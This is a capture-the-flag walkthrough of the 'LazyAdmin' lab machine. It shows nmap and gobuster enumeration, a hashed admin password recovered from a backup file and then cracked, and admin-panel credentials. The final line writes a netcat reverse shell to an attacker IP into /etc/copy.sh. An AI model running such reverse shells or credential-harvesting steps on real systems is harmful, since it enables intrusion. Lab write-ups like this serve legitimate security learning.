### LazyAdmin


####  Lazy Admin

What is the user flag?


What is the root flag?


Enumeration:

Nmap scan:

Ports 22 and 80 are open:

```
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/LazyAdmin]
└─$ nmap -sC -sV -oN nmap_results.txt 10.10.35.168 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 22:01 EDT
Nmap scan report for 10.10.35.168
Host is up (0.64s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.38 seconds
                                                                                                                       
┌──(kali㉿kali)-[~/ken/MoonShine/CTF/LazyAdmin]
└─$ 

```


Gobuster scan:

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u "http://10.10.35.168:80" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o /home/kali/ken/MoonShine/CTF/LazyAdmin/gobuster_scan.txt -t 64 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.168:80
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/19 22:02:22 Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 314] [--> http://10.10.35.168/content/]
Progress: 935 / 220561 (0.42%)                                                   ^C
[!] Keyboard interrupt detected, terminating.
                                                                                  
===============================================================
2022/08/19 22:02:38 Finished
===============================================================
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 

```

Going to /content page, we can see that there is a maintenance page, so we enumerate the /content page further using gobuster:


```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u "http://10.10.35.168/content" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o /home/kali/ken/MoonShine/CTF/LazyAdmin/gobuster_scan2.txt -t 64
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.35.168/content
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/19 22:05:02 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 321] [--> http://10.10.35.168/content/images/]
/js                   (Status: 301) [Size: 317] [--> http://10.10.35.168/content/js/]    
/inc                  (Status: 301) [Size: 318] [--> http://10.10.35.168/content/inc/]   
/as                   (Status: 301) [Size: 317] [--> http://10.10.35.168/content/as/]    
/_themes              (Status: 301) [Size: 322] [--> http://10.10.35.168/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.35.168/content/attachment/]
Progress: 7455 / 220561 (3.38%)                                                             ^C
[!] Keyboard interrupt detected, terminating.
                                                                                             
===============================================================
2022/08/19 22:06:28 Finished
===============================================================
                                                                                                                       
┌──(kali㉿kali)-[~]
└─$ 

```

Using trial and error, we go to every pages, looking for possible attack vectors and low hanging fruit:

![[Pasted image 20220819220737.png]]

Looking further, we see that there is a mysql_backup folder and we will try to open the file:

![[Pasted image 20220819220836.png]]


Opening up the file, we can see that there are lying credentials on the file:

username: manager
password: hashed pw


![[Pasted image 20220819220959.png]]

Lets use crackstation to check the hash and hopefully we can get a plaintext password:

![[Pasted image 20220819221123.png]]

Password: Password123

Using those credentials, we can now login to 10.10.35.168/content/as/




admin: manager
passwd : 42f749ade7f9e195bf475f37a44cafcb | Password123


rice:randompass


echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.167 5555 >/tmp/f" > /etc/copy.sh